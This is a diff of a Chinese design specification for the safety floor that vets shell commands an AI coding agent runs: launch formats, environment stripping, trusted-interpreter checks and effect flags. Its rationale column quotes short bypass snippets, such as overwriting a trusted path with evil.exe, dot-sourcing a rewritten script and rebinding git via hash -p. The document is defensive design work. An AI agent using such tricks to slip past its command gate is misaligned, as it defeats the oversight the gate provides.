@@ -5,9 +5,9 @@
 > 部分与文件集里的其他文件只引用 ID，不转述。** 改一条规则就是改本文 §2 的那一行；`scripts/check_design_set.py`
 > 核每个 ID 恰好定义一次、每个引用存在、每个 ID 至少有一条门槛与一个 PR。
 
-**日期：** 2026-09-03
-**状态：** 设计，**rev 25** —— 拆分版，以 rev 24（冻结于 commit `e01293f`）为底；**拆分带来的每一处语义偏离都列在
-评审记录的 rev 25 行**，不在这里转述。二十二轮评审、一百四十三条发现的记录在评审记录文件。**独立于本规范的 PR-0**（子代理没有权限引擎，一处已实测的活缺陷）
+**日期：** 2026-09-04
+**状态：** 设计，**rev 26** —— 拆分版（rev 25）经一轮完整安全评审后的修订，以 rev 24（冻结于 commit `e01293f`）
+为底；**相对 rev 24 的每一处语义偏离都列在评审记录的 rev 25 与 rev 26 行**，不在这里转述。二十二轮评审、一百四十三条发现的记录在评审记录文件。**独立于本规范的 PR-0**（子代理没有权限引擎，一处已实测的活缺陷）
 已拆出为 `subagent-runtime-safety-plan.zh.md`，其引擎那一半应立即修。
 **Anchors:** agentao `main@3537753`（2026-09-01）；codex `openai/codex@b7cd519c76`（2026-08-31）；
 pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；引文全部在证据文件。
@@ -17,7 +17,7 @@ pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；�
 `subagent-runtime-safety-plan.zh.md`（原 PR-0）。
 **约定：**
 - 规则 ID 形如 `族-NN`。本文的族：`TOOL` `SPEC` `LAUNCH` `ENV` `IMG` `LADDER` `CFG` `TOK` `LOWER` `WRAP`
-  `NAME` `EFF` `CMD`。子代理计划的族：`SUB` `MCP` `ENG`。
+  `NAME` `EFF` `CMD` `BASH`。子代理计划的族：`SUB` `MCP` `ENG`。
 - 不带「本文」前缀的「§2.x」「§3.x」与「证据 §4」一律指证据文件的小节；指本文自己的节一律写「本文 §N」；
   「PR-N」指实现文件的阶梯；「Gnn」「Gnn-mm」指门槛矩阵的行。
 - 本文 §2 各表「规则」列的每一句都是 MUST；「为什么」只允许一句，长论证在证据文件与评审记录。
@@ -41,7 +41,7 @@ pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；�
 | 不可信输入 | 模型写出的 body；工作树里的任何文件与二进制；子进程继承的环境（`PATH` 条目、`BASH_ENV`、`ENV`、`BASH_FUNC_*`、`SHELLOPTS`）；机器 `PATH` 上任何用户可写的目录；CurrentUser 模块目录；在「解析」与「spawn」之间被写入的配置或映像 |
 | 可信输入 | 用户级 `permissions.json` 的 `shell` 块；宿主的构造参数；「子进程主体写不了」的目录（IMG-01）；宿主信任的代码签名；宿主的 identity allowlist（**仅作附加**，IMG-03）；`enable_hardline=False`（仅构造参数，不在任何 `permissions.json` 里）会关掉整个地板 —— 那是宿主的信任决定，子代理按身份继承它（SUB-01） |
 | 执行主体 | 子进程将要以之运行的那个 token。提权运行的 agentao 自己就是管理员，于是可信集为空、阶梯走空（IMG-01、LADDER-03）—— 那是裁定，不是例外 |
-| 守卫的资产 | 地板的 18 类不可恢复操作（§3.5）扩展到 PowerShell 与 cmd；「未被确立为惰性的程序不得运行」（EFF-04）；「解释器与裸词在地板的环境里解析」（ENV-01） |
+| 守卫的资产 | 地板的 18 类不可恢复操作（§3.5）扩展到 PowerShell 与 cmd；「未被确立为惰性的程序不得**启动**」（EFF-04）；「解释器与裸词在地板的环境里解析」（ENV-01）。**封闭集关掉的是启动哪个程序，不是那个程序跑了什么：** 一个可信工具链按设计执行工作树内容（`git` 的 hooks、`npm` 的 scripts、`make`、`pytest`、`cargo build`）是产品目的（本文 §7.1）；那些代码做什么，只有 18 类地板管得着，而且它管的是命令文本，不是子进程的行为 |
 | 明写不关闭的残留 | 会话配置 TOCTOU；解释器替换（本文 §7；门槛 G21 的两支刻画性探针） |
 
 **今天 → 目标。** 目标列只写 ID；定义在本文 §2。
@@ -76,46 +76,48 @@ pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；�
 | ID | 规则 | 为什么 | 证据 |
 |---|---|---|---|
 | **SPEC-01** | `ShellDialect` 只有 `POSIX`、`POWERSHELL`、`CMD`、`UNKNOWN`。`UNKNOWN` 与地板不认识的任何取值 ⇒ 在匹配任何规则之前返回 `hardline:unknown-dialect-opaque` | 宿主 executor 正是无标注方言进来的地方；回退到 POSIX 扫描器等于用错的模式报一个干净的地板 | §2.9、证据 §4 |
-| **SPEC-02** | `rung` 是 spec 的第二个字段，取值 `pwsh`、`powershell`、`cmd`、`git_bash`、`system_posix`。合法配对是枚举的（本文 §3 `LEGAL_PAIRS`），在 spec **构造时**校验，失败点名那个配对；漏到地板的非法配对或不认识的 rung ⇒ 在匹配任何规则之前返回 `hardline:unknown-rung-opaque` | 方言选分析方式，rung 决定封闭集政策是否生效；「不认识 → `system_posix`」会整个绕过封闭集 | §3.13 |
-| **SPEC-03** | `system_posix` 的封闭集政策**默认关闭**（TOK-02、EFF-*、IMG-02 都不生效，裁定与今天相同），直到本文 §7 q4 定案；`git_bash` 政策开 | 在 Linux 上三者都是每一位现有用户的行为变更，默认值要被选出来、不是继承下来 | §3.5 |
+| **SPEC-02** | `rung` 是 spec 的第二个字段，取值 `pwsh`、`powershell`、`cmd`、`legacy_cmd`、`git_bash`、`system_posix`（`legacy_cmd` 只在翻转前合法，LADDER-05）。合法配对是枚举的（本文 §3 `LEGAL_PAIRS`），在 spec **构造时**校验，失败点名那个配对；漏到地板的非法配对或不认识的 rung ⇒ 在匹配任何规则之前返回 `hardline:unknown-rung-opaque` | 方言选分析方式，rung 决定封闭集政策是否生效；「不认识 → `system_posix`」会整个绕过封闭集 | §3.13 |
+| **SPEC-03** | `system_posix` 与 `legacy_cmd` 的封闭集政策**关闭**（TOK-02、EFF-*、IMG-02、BASH-01 都不生效，裁定与今天相同）—— 前者直到本文 §7 q4 定案，后者直到 PR-7 删除它；`git_bash` 政策开，它的语法闸是 BASH-01 | 在 Linux 上三者都是每一位现有用户的行为变更，默认值要被选出来、不是继承下来 | §3.5 |
 | **SPEC-04** | `filesystem_is_local: bool`，字段缺席即 `false`。「本机」只有一个意思：子进程打开的那条路径就是地板 stat 过的那条路径；同一宿主上的容器、chroot 与 mount namespace 都不算 | 在错的文件系统上做的检查不是检查 | §2.9 |
 | **SPEC-05** | 非本机执行器欠三段义务：**解析**（IMG-06 的每一问、含 NAME-* 的裸词搜索，都针对目标作答）、**证明**（答案绑定目标的主体、目标的环境、子进程实际会打开的映像）、**启动**（LAUNCH-01 的请求原样运行）。未提供 oracle 时，每一个需要映像的命令词不透明 | 裸词搜索是目标机上的一次文件系统操作，不是地板手里的一个事实 | §3.13 |
+| **SPEC-07** | `ShellSpec` 构造后**不可变**；预检结果、解释器身份与 launcher 哈希都在构造时写入。重解析只在三个事件上发生 —— 构造、`add_tool(replace=True)` 换入新的 `ShellSpecProvider`、宿主显式调用重解析 —— 每次产生**新对象**，工具实例原子地换引用；TOOL-04 每次调用读一次那个引用。后台子代理按身份共享同一个对象（SUB-01），所以不可变是它不撕裂的全部理由 | 一份可变的 spec 在多线程读者之间就是 ENG-01 刚为引擎修掉的那种撕裂读 | §2.15 |
 | **SPEC-06** | spec 携带 PowerShell rung 的预检结果 `closed_env_established: bool`（IMG-09 写入）。`_decide` 跑的时候它是手里的值，不是将来的一次观测 | 地板在任何子进程存在之前裁定，事后子进程报告什么都改不了已给出的裁定 | §3.13 |
 
 ### 2.3 `LAUNCH` —— 启动请求与命令行
 
 | ID | 规则 | 为什么 | 证据 |
 |---|---|---|---|
-| **LAUNCH-01** | agentao 构造启动请求，执行器**原样**运行。请求是可判别的：`PosixLaunch`（`executable`、`argv`、`env`、`cwd`）或 `WindowsLaunch`（`application_name`、`command_line`、`env`、`cwd`），外加 `execution_subject` 与 `attested_images`（证明步骤解析出的规范映像） | 单一 `argv` 表达不了 cmd 行的「字符串 + `executable=`」；不带主体与映像，执行器可以一边照办命令行、一边启动别的东西 | §3.12、证据 §4 |
-| **LAUNCH-02** | `pwsh` / `powershell.exe`：`"<path>" -NoProfile -NonInteractive -Command "<前奏>; <body>"`，不传 `-ExecutionPolicy Bypass`，`Popen(list, shell=False)`，前奏与 body 是**一个**元素、绝不拆到多个参数。G18 的哨兵断言子进程收到的 body 与地板扫过的逐字节相同；G18 红 ⇒ 该 rung 改用 LAUNCH-03 的「单字符串 + `executable=`」形式 | Windows 上列表形式一律被 `list2cmdline` 再序列化一次，「不重新加引号」只能靠哨兵核验 | §3.12 |
+| **LAUNCH-01** | agentao 构造启动请求，执行器**原样**运行。请求是可判别的：`PosixLaunch`（`executable`、`argv`、`env`、`cwd`）或 `WindowsLaunch`（`application_name`、`command_line`、`env`、`cwd`），外加 `execution_subject`、`attested_images`（证明步骤解析出的规范映像 —— 它是交给执行器复核的**证据**，不是本机的强制手段：子进程自己解析后续命令词，强制靠 ENV-01）与 `env_delta`（要设定的键、要移除的键模式；执行器把它施加到**目标**的基础环境上 —— 本机执行器的基础环境就是剥离了 provider 凭据的那份，非本机执行器的是 oracle 答出的那份）。macOS 的 `sandbox-exec` 包装是 agentao 写进 `argv` 的一部分。`launch()` 阶段的拒绝（重哈希、重读、超长）经与地板相同的 DENY 事件浮出，reason 按本文 §3 词表，绝不是一个模型会重试的工具错误 | 单一 `argv` 表达不了 cmd 行的「字符串 + `executable=`」；不带主体与映像，执行器可以一边照办命令行、一边启动别的东西 | §3.12、证据 §4 |
+| **LAUNCH-02** | `pwsh` / `powershell.exe`：`"<path>" -NoProfile -NonInteractive -Command "<前奏>; <body>"`，不传 `-ExecutionPolicy Bypass`，`Popen(list, shell=False)`，前奏与 body 是**一个**元素、绝不拆到多个参数。G18 的哨兵断言子进程收到的 body 与地板扫过的逐字节相同；G18 红 ⇒ 该 rung 改用 LAUNCH-03 的「单字符串 + `executable=`」形式；两种形式都红 ⇒ `-EncodedCommand <base64(UTF-16LE(前奏; body))>`，它逐字节可靠，代价是 EDR 启发式常把它当恶意，选它时把这一代价写进发布说明 | Windows 上列表形式一律被 `list2cmdline` 再序列化一次，「不重新加引号」只能靠哨兵核验 | §3.12 |
 | **LAUNCH-03** | `cmd`：单一字符串 `"<path>" /d /e:on /v:off /s /c "<body>"`，`Popen(..., executable=<path>)` 设 `lpApplicationName`；body 绝不再次加引号 | `/s` 剥外层引号，`/d` 跳过 AutoRun，`/e:on /v:off` 钉住状态 | §3.12 |
 | **LAUNCH-04** | Git Bash：`"<path>" --noprofile --norc -p -c <body>`，长选项在前，`shell=False`，环境按 ENV-03 清除，`MSYS_NO_PATHCONV=1` | `-p` 挡继承函数与 `SHELLOPTS`、覆盖 `BASH_ENV` 与 `ENV`，但只护它启动的那个进程；顺序反了报 `invalid option` | §3.16 |
 | **LAUNCH-05** | 前奏逐字节固定：`$PSModuleAutoLoadingPreference='None'; if ($PSModuleAutoLoadingPreference -ne 'None' -or $PSVersionTable.PSEdition -ne '<E>' -or $PSVersionTable.PSVersion.ToString() -ne '<V>' -or (Get-Item -LiteralPath $PSHOME).FullName -ne '<H>' -or <C-check>) { exit 97 }`。`<E>`、`<V>`、`<H>`、`<C>` 是预检记录的 edition、version、`$PSHOME` 与生效控制台会话配置名，各以单引号 PowerShell 字面量代入、内嵌 `'` 双写；无法这样编码 ⇒ 拒绝该 rung，不换转义方式 | 守卫是同一个参数的后半截，没有任何 body 字节能抢在它前面运行 | §3.13、§3.20 |
 | **LAUNCH-06** | `<C>` 不得悄悄省略：找不到能在子进程内报出生效控制台会话配置的表达式时，除非预检在三个来源（IMG-08）都没发现配置，否则拒绝该 rung；`<C>` 不能用 `$PSHOME` 顶替 | 安装目录替一个 endpoint 名字作证是作不了的 | §3.20 |
 | **LAUNCH-07** | 前奏不改动 body、不扰动 body 的语义；地板的保证是它扫过了 body，前奏是地板从不改动的文本 | 一段第一条语句带副作用的 body 在前奏之后必须产生同样的副作用 | §3.13 |
+| **LAUNCH-08** | 组装出的命令行（含前奏、参数与 body）超过平台上限 —— Windows 为 32767 个 WCHAR，POSIX 为 `ARG_MAX` 减去环境 —— ⇒ 在任何分析之前拒绝，理由 `launch-oversize`；**绝不截断** | 截断落在 cmd `/s` 的「首尾引号」之间时，地板看到的结构与 cmd 执行的结构不同 | §3.12 |
 
 ### 2.4 `ENV` —— 子进程环境
 
 | ID | 规则 | 为什么 | 证据 |
 |---|---|---|---|
 | **ENV-01** | 每一级子进程的 `PATH` = 过滤后的 PATH：只留「子进程主体写不了」的目录（IMG-01 同一谓词），剔除空的、相对的、工作目录与项目根内的条目；由 agentao 自己搜索，绝不用 `shutil.which` | 把被剔目录留在子进程 PATH 里，等于让子进程解析地板刚拒绝的东西；`which` 在 Windows 上先搜当前目录 | §3.11、§3.13 |
-| **ENV-02** | `PATHEXT=.COM;.EXE`，每一级都设；bash 忽略它，统一起见照设 | 关掉 `.cmd`/`.bat`/`.ps1` 的裸词解析 | §3.13 |
+| **ENV-02** | `PATHEXT=.COM;.EXE`，每一级都设；bash 忽略它，统一起见照设 | 对 cmd 与 PowerShell 的外部命令发现关掉 `.cmd`/`.bat`；PowerShell 是否先于 `PATHEXT` 找 `name.ps1` **未核实**（G21-13）—— 若是，`.ps1` 只靠「可信目录里没有攻击者的文件」挡住 | §3.13 |
 | **ENV-03** | **每一级**：`BASH_ENV`、`ENV` 与每一个 `BASH_FUNC_*` 条目从子进程环境**移除**，不是覆盖 —— 不只 bash rung，因为被放行的可信命令在任何 rung 上都可能再起一个 bash（Git for Windows 的 `!` 别名与 hook 经它自带的 `sh.exe`） | `-p` 只护一个进程，环境贯穿整棵树：可信 `git` 经 `/bin/sh -c` 跑别名，那个 bash 就从继承环境导入 `BASH_FUNC_git%%` | §3.14、§3.16 |
 | **ENV-04** | cmd rung：`NoDefaultCurrentDirectoryInExePath=1` | cmd 裸词先搜当前目录 | §3.13 |
-| **ENV-05** | PowerShell rung：模块自动加载由前奏关掉（LAUNCH-05）；`PSModulePath` 仍钉死，作纵深防御、不作机制 —— 启动会重组它，交进去的值是输入不是设置 | 模块集合钉不住；CurrentUser 模块目录在工作树之外，自动加载会在 PATH 之前先搜它 | §3.13 |
+| **ENV-05** | PowerShell rung：模块自动加载由前奏关掉（LAUNCH-05）；`PSModulePath` 仍钉死 —— 只含满足 IMG-01 的安装根模块目录 —— 作纵深防御、不作机制 —— 启动会重组它，交进去的值是输入不是设置 | 模块集合钉不住；CurrentUser 模块目录在工作树之外，自动加载会在 PATH 之前先搜它 | §3.13 |
 
 ### 2.5 `IMG` —— 可信映像、解释器身份与封闭可运行集
 
 | ID | 规则 | 为什么 | 证据 |
 |---|---|---|---|
-| **IMG-01** | 可信根谓词只有一个：**子进程将要以之运行的那个 token，不能修改、删除或替换这条路径或它所在的目录。** 「仅管理员可写」不是这条规则。每一个候选根都答「能」时，可信集为**空**，该 rung 被拒绝（LADDER-03）。POSIX 主机上的等价谓词（root 所有、既非组可写也非全局可写）随 本文 §7 q4 一起定 | 提权运行的 agentao 自己就是管理员；一个谓词服务三个消费者 —— 解释器选择、IMG-02 的映像半、ENV-01 | §3.13；提权态本身是推理，未实测 |
+| **IMG-01** | 可信根谓词只有一个：**子进程将要以之运行的那个 token，不能修改、删除或替换这条路径，也不能修改、删除、替换或重命名从它到卷根的任何一个祖先目录。** 「仅管理员可写」不是这条规则；「能不能」的访问掩码语义与 reparse 处理在 IMG-06。每一个候选根都答「能」时，可信集为**空**，该 rung 被拒绝（LADDER-03）。POSIX 主机上的等价谓词（root 所有、既非组可写也非全局可写）随 本文 §7 q4 一起定 | 提权运行的 agentao 自己就是管理员；一个谓词服务三个消费者 —— 解释器选择、IMG-02 的映像半、ENV-01 | §3.13；提权态本身是推理，未实测 |
 | **IMG-02** | 可运行集按方言封闭，由两个互相独立的条件封闭：**名字** —— 归一后的命令词在该方言的可信表里有条目，并带 EFF-01 的标志；**映像** —— 子进程将要打开的那个文件落在可信根内（IMG-01）。缺任一半 ⇒ **这一条命令**不透明，不只是其后 | 有名字没映像是被拷进工作树的 `git.exe`；有映像没名字是可信目录里没人分类过的程序 | §3.13 |
 | **IMG-03** | 宿主 identity allowlist 是压在位置**之上的附加条件**，永不替代位置。它的两种形式不是一回事：**content pin**（绝对路径 + 内容哈希）测「正是这个文件被换掉了」；**publisher trust**（宿主信任的签名）只证「此刻在那里的文件是可信发布者签的」。两者都不能放行一个被位置拒掉的文件 | body 内 `Copy-Item .\evil.exe <路径>; <那个词>` 不需要竞态就击破哈希，而往文件系统路径的 `Copy-Item` 在 EFF-05 下是惰性的 | §3.13 |
 | **IMG-04** | 显式 `.exe`/`.com` 路径归一到 basename 作为命令词（5a）；其它扩展名（5b）、无扩展名路径（5c）、`-File`（5d）⇒ 不透明。**工作树永远不是可信根** | 静态路径不等于不可变字节 | §3.9 |
-| **IMG-05** | 解释器发现分两档，不对称。**(a) 自动：** 已知绝对安装位置，目录满足 IMG-01，且映像在**任何启动之前**通过宿主侧身份检查 —— 宿主信任的签名，或 allowlist 里「绝对路径 + 内容哈希」的一条。**(b) 显式：** 用户 `shell.path`，绝对且在项目根之外，是一次明写的信任授权，不要求签名。过滤后的 PATH 命中**不是**候选 | 一个程序不能靠「把它跑起来」认证：跑起来正是这道检查要门住的事件 | §3.3、§3.11、证据 §4 |
-| **IMG-06** | 映像的四问走一个**宿主侧** identity oracle（可注入）：主体能否修改/删除/替换某路径或其目录；某路径在命令将要运行的那台机器上解不解析得到；某映像带不带宿主信任的签名；某映像的内容哈希。Windows 上它对子进程 token 读 ACL、并读 Authenticode；非本机时它是执行器自己的（SPEC-05）；测试里注入 | 第二问不是装饰：NAME-* 靠搜索过滤后的 PATH，那是目标机上的文件系统操作；有了 oracle，G04 的正例在 ubuntu 上是桩、在 Windows 上是真的 | §3.13 |
+| **IMG-05** | 解释器发现分两档，不对称。**(a) 自动：** 已知绝对安装位置，目录满足 IMG-01，且映像在**任何启动之前**通过宿主侧身份检查 —— 宿主信任的签名，或 allowlist 里「绝对路径 + 内容哈希」的一条。**(b) 显式：** 用户 `shell.path`，绝对且在项目根之外，是一次明写的信任授权：**免签名，不免位置** —— 它所在目录链同样要过 IMG-01，否则解释器的整个加载闭包（本文 §7.1）落在主体可写的目录里，一条惰性的 `Copy-Item` 就能换掉 launcher 旁边的任何 DLL，而重哈希只覆盖 launcher。用户范围的安装（scoop、winget 用户范围、Store 的 app execution alias）由此被拒，答案在 q12。过滤后的 PATH 命中**不是**候选 | 一个程序不能靠「把它跑起来」认证：跑起来正是这道检查要门住的事件 | §3.3、§3.11、证据 §4 |
+| **IMG-06** | 映像的四问走一个**宿主侧** identity oracle（可注入）：主体能否修改/删除/替换某路径或其目录；某路径在命令将要运行的那台机器上解不解析得到；某映像带不带宿主信任的签名；某映像的内容哈希。Windows 上它对子进程 token 读 ACL、并读 Authenticode；非本机时它是执行器自己的（SPEC-05），并另答目标的基础环境与 PATH 条目（LAUNCH-01 的 `env_delta`、ENV-01）；测试里注入。**「能替换」的语义是访问掩码，不是「可写」一个词：** 文件上 `WRITE_DATA`、`APPEND_DATA`、`DELETE`、`WRITE_DAC`、`WRITE_OWNER` 任一，或所有权；目录上 `FILE_ADD_FILE` 与 `FILE_DELETE_CHILD`、`DELETE`、`WRITE_DAC`、`WRITE_OWNER` 任一，或所有权；从映像到卷根的每一个祖先都求值；链上的 junction、symlink 与 app execution alias 先解析到目标，目标与别名所在目录**都**要过。路径先规范化 —— 8.3 短名、大小写、尾随点与空格、`\\?\` 前缀展开；NTFS ADS 一律拒绝 —— 规范化后的路径才用于 IMG-03 的 `entry_for` | 第二问不是装饰：NAME-* 靠搜索过滤后的 PATH，那是目标机上的文件系统操作；有了 oracle，G04 的正例在 ubuntu 上是桩、在 Windows 上是真的 | §3.13 |
 | **IMG-07** | PowerShell rung 绑定实测的解释器身份 `(绝对路径, edition, version)`，**从映像里、在宿主侧读**（PE 版本资源或安装清单），绝不取自子进程的 `$PSVersionTable`。身份不属于实测表的解释器 ⇒ 该 rung 的裸词全部不透明（NAME-02）。预检记录 launcher 的内容哈希，spawn 前立刻重哈希 | 版本资源可信是覆盖映像的签名买来的；哈希只覆盖 launcher，安装根可写就绕过它 —— 所以身份真正靠的是 IMG-01 加签名 | §3.20、证据 §4 |
-| **IMG-08** | 任何启动之前先从磁盘读**三个来源**的配置：解析出的 `$PSHOME` 下那份 AllUsers `powershell.config.json`、用户 profile 下那份 CurrentUser，以及优先于两者的 Group Policy。生效控制台会话配置不是默认 ⇒ 拒绝该 rung。`$PSHOME` 是宿主侧解析出的安装根（正在执行的 `System.Management.Automation.dll` 所在目录），解析不出 ⇒ 拒绝，绝不退回 launcher 所在目录。spawn 前立刻重读三个来源 | 去问解释器它的会话配置是什么，等于先跑了那份配置 | §3.20 |
+| **IMG-08** | 任何启动之前先从磁盘读**三个来源**的配置：解析出的 `$PSHOME` 下那份 AllUsers `powershell.config.json`、用户 profile 下那份 CurrentUser，以及优先于两者的 Group Policy。生效控制台会话配置不是默认 ⇒ 拒绝该 rung。`$PSHOME` 是宿主侧解析出的安装根（正在执行的 `System.Management.Automation.dll` 所在目录），解析不出 ⇒ 拒绝，绝不退回 launcher 所在目录。spawn 前立刻重读三个来源。**edition 5.1（`powershell.exe`）没有 `powershell.config.json`，也没有控制台会话配置：** 它的三来源只剩 Group Policy，LAUNCH-06 的「三来源都没发现配置」按构造成立 —— 这是推理，G21-14 在 Windows job 上核 | 去问解释器它的会话配置是什么，等于先跑了那份配置 | §3.20 |
 | **IMG-09** | 只在 (a) 或 (b) 认证过映像之后，阶梯才用同一段前奏配一段 body 启动候选解释器做预检：body 报告自动加载偏好，并把身份字段作为对宿主已认证映像的**一致性核对**再报一遍，绝不作为来源。结果写入 SPEC-06 的字段 | 一次启动确立不了被启动者的任何事；预检只是核对 | §3.13 |
 
 ### 2.6 `LADDER` —— 阶梯
@@ -125,6 +127,7 @@ pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；�
 | **LADDER-01** | 顺序 `pwsh` → `powershell.exe` → Git Bash（仅当 `shell.allow_git_bash`）→ `cmd`。解析器缺失使 PowerShell 不可选。每一级都要过 IMG-05、IMG-01 与（PowerShell 级）IMG-07、IMG-08 | 带开关的那一级排在 `cmd` 之上，因为每个受支持的 Windows 上都有 `cmd.exe`，排在它之下不可达 | §2.1 |
 | **LADDER-02** | `allow_git_bash` 默认 `false`，只在用户级 `shell` 块或构造 spec 里（CFG-01）；在末级被选定**之前**读；开关开而找不到 Git Bash ⇒ `cmd` | 守在 `cmd` 之下的开关是死代码，而门槛会绿在生产环境走不到的路径上 | §3.13 |
 | **LADDER-03** | 阶梯走空（每一级被拒）⇒ 工具**仍然注册**，每次调用返回 `hardline:no-trusted-rung-opaque`；不注销工具，不退回 `%COMSPEC% /c` 加惰性地板 | 注销藏起理由；退回是实现者最顺手、也最弱的一种 | §2.4 |
+| **LADDER-05** | 翻转之前（PR-1 至 PR-6）Windows 的默认执行器报 `CMD × legacy_cmd`：`%COMSPEC% /c`、今天的环境、今天的（空转的，§2.4）regex 地板，裁定与 `main@3537753` 逐段相同；它不是阶梯的一级，阶梯只在翻转后运行。PR-7 删除这个取值，之后报它的 spec 按 SPEC-02 拒绝 | 没有这个值，翻转前的 Windows 要么在 PR-2 就被翻转（`CMD × cmd`），要么每次调用 DENY（`UNKNOWN`），要么用 POSIX 模式扫 cmd 文本报干净地板（`system_posix`）—— 三条各违反一条规则 | §2.1、§2.4 |
 | **LADDER-04** | 翻转（PR-7）的前提：G09 的三个桶降级率经接受、`ruff` 绿；Git Bash rung 只在 G20 绿时启用，红则关着这一级发布 | 不为 Windows 声称没在 Windows 上测过的东西 | §2.5 |
 
 ### 2.7 `CFG` —— 配置
@@ -175,15 +178,22 @@ pi-mono `@853a80d26`（2026-08-28）。本文自身不含 `file:line` 引文；�
 
 | ID | 规则 | 为什么 | 证据 |
 |---|---|---|---|
-| **EFF-01** | 方言可信集里每一条 —— NAME-01 的内部命令、NAME-02 的 cmdlet 与别名、POSIX 表、每一级的内建集 —— 都带一**组**标志，结合它拿到的参数判定，标志不互斥：*（无）* 惰性；`rebinds_after`；`executes_input`；`rebinds_caller` | 一张闭表加一句「表外不是修改者」是黑名单：`printf -v PATH`、`read PATH`、`hash -p` 直接穿过 | §3.15 |
+| **EFF-01** | 方言可信集里每一条 —— NAME-01 的内部命令、NAME-02 的 cmdlet 与别名、POSIX 表、每一级的内建集 —— 都带一**组**标志，结合它拿到的参数判定，标志不互斥：*（无）* **惰性** —— 不写任何环境变量、不绑定任何名字、不改变 provider 驱动器，也不把**命令行供给的**任何输入（参数、管道输入、字面串、被点名的文件）当代码运行；`rebinds_after`；`executes_input`；`rebinds_caller`。惰性说的是**这条命令行**：一个按设计执行工作树内容的可信工具链（`git commit` 跑 hooks）在此定义下仍可为惰性，那是本文 §1 划出的边界；改变当前位置不在定义里，因为相对路径永不可信（IMG-04）、cmd 的当前目录搜索已被 ENV-04 关掉 | 一张闭表加一句「表外不是修改者」是黑名单：`printf -v PATH`、`read PATH`、`hash -p` 直接穿过 | §3.15 |
 | **EFF-02** | 后果：惰性 → 受信任，再无下文；`rebinds_after` → 本 body 内其后每条不透明；`executes_input` → **这条命令自身**不透明，唯一例外是不含 `Dynamic` 的字面字符串按本方言重新进入（WRAP-04 4a），**文件目标一律不透明**、路径长什么样都一样；`rebinds_caller` → 按 EFF-03 传播 | 静态路径不等于不可变字节：`Set-Content safe.ps1 evil; . .\safe.ps1` 在一个 body 内 | §3.15 |
 | **EFF-03** | 递归分析返回一份退出态摘要（这段 body 退出时有没有留下被重绑的名字）；带 `rebinds_caller` 的调用方把它并入自己的状态，使调用点之后的每条命令不透明；子进程形式（`bash ./x`）不传播，只适用 `executes_input` | 只有一行 `hash -p ./evil git` 的 `safe.sh` 单独看什么都不透明，`source ./safe.sh; git status` 却拿被重绑的表跑 `git` | §3.15 |
 | **EFF-04** | 命令词根本解析不到任何条目 ⇒ **这一条**不透明，其后每条也不透明。没有任何东西隐含地带 `executes_input`；可信表之外的每一个程序都是 DENY，直到有人带着它的效果加一行 | 只污染后继是一行就能利用的洞：单命令脚本没有后继可污染 | §3.15 |
 | **EFF-05** | PowerShell：参数只要点名了非文件系统的 provider 驱动器 —— 匹配 `^[A-Za-z][A-Za-z0-9]*:` 且不是盘符路径 —— 不论 cmdlet 是什么，该命令即为非惰性 | 一条规则关掉 `Env:`、`Alias:`、`Function:`、`Variable:` 与注册表驱动器；往 `C:\` 的 `Copy-Item` 仍是惰性 | §3.15 |
 | **EFF-06** | 惰性断言所依赖的任何位置上出现 `Dynamic` token ⇒ 不透明（TOK-02） | | §3.9 |
-| **EFF-07** | 逐方言的 `executes_input` 集合（`+` 表示同时 `rebinds_caller`）：PowerShell `Import-Module`/`ipmo`+、`Invoke-Expression`/`iex`+、作用于路径的 `.`+、`Add-Type`+、作用于路径的 `&`、`-File`；cmd `call <file>`+、`start <file>`；bash `.`/`source`+、`eval`+；以及任何被喂了脚本路径的解释器。PowerShell 里「作用于路径的 `.` 与 `&`」两条在 LOWER-02 之下到不了本条（WRAP-04 的可达性），保留为纵深。枚举出来的修改形式（cmd `set`/`path`/`setx`/`call set`/`for /f … do set`；PowerShell `$env:`/`*-Item`/`Set-Content`/`[Environment]::SetEnvironmentVariable`；bash `PATH=`/`export`/`declare -x`/`env PATH=`/`printf -v`/`read`/`hash -p`/`alias`/函数定义/`BASH_ENV=`/`ENV=`）是**门槛用例，不是规则** | 往清单里加一种形式不改变任何行为，只是加一条规则本就通过的测试 | §3.15 |
+| **EFF-08** | 可信表是**数据，不是代码**：每条条目登记 `execution_triggers`（哪些参数形状让它把命令行供给的东西当代码运行 —— `git -c core.pager=`、`git --exec-path=`、`python -c`、`node -e`、`explorer <.lnk>`）、`rebind_triggers`、`caller_scope`、`predicate_positions`，每一项带来源；`flags(args)` 由这些字段推出，没有别的来源。没有登记触发参数的条目不得进表 | 一个函数形式的表无从评审，而 q9 的每一条都是一份需要有人核验的断言 | §3.15 |
+| **EFF-07** | 逐方言的 `executes_input` 集合（`+` 表示同时 `rebinds_caller`）：PowerShell `Import-Module`/`ipmo`+、`Invoke-Expression`/`iex`+、作用于路径的 `.`+、`Add-Type`+、作用于路径的 `&`、`-File`；cmd `call <file>`+、`start <file>`（两者在 CMD-01 与 WRAP-05 之下到不了本条，同 WRAP-04 的可达性，保留为纵深 —— q11 里 `call` 那一半因此是死问题）；bash `.`/`source`+、`eval`+；以及任何被喂了脚本路径的解释器。PowerShell 里「作用于路径的 `.` 与 `&`」两条在 LOWER-02 之下到不了本条（WRAP-04 的可达性），保留为纵深。枚举出来的修改形式（cmd `set`/`path`/`setx`/`call set`/`for /f … do set`；PowerShell `$env:`/`*-Item`/`Set-Content`/`[Environment]::SetEnvironmentVariable`/`Set-Alias`/`New-Alias`/`Set-Variable`/`New-Item -Path Function:`；bash `PATH=`/`export`/`declare -x`/`env PATH=`/`printf -v`/`read`/`hash -p`/`alias`/函数定义/`BASH_ENV=`/`ENV=`）是**门槛用例，不是规则** | 往清单里加一种形式不改变任何行为，只是加一条规则本就通过的测试 | §3.15 |
 
-### 2.13 `CMD` —— cmd 方言
+### 2.13 `BASH` —— git_bash 那一级的语法闸
+
+| ID | 规则 | 为什么 | 证据 |
+|---|---|---|---|
